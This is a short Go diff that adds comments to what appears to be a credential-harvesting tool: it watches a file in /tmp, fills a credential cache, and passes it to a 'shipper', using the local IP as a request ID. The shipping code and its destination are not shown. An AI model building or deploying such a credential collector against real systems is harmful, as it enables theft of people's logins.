@@ -9,15 +9,18 @@ import (
 	"time"
 )
 
+// watch passes the files/cache into the file_watch functions
 func watch(files []string, c *cred_cache.CredCache) {
 	checkFiles(files, c)
 }
 
+// ship passes the cred cache into the shipper
 func ship(c *cred_cache.CredCache, min int) {
 	shipIt(c, min)
 
 }
 
+// getIP records the IP so we can use it as an ID for requests
 func getIP() string {
 	conn, _ := net.Dial("udp", "8.8.8.8:80")
 	defer conn.Close()
@@ -26,8 +29,9 @@ func getIP() string {
 	return ipStr
 }
 
+// Define files to track, initiate the cache, watch/ship it
 func main() {
-	files := []string{"/tmp/nomnom.def"}
+	files := []string{"/tmp/nomnom.def"} // []string of files to watch
 	min := 5
 	ip := getIP()
 
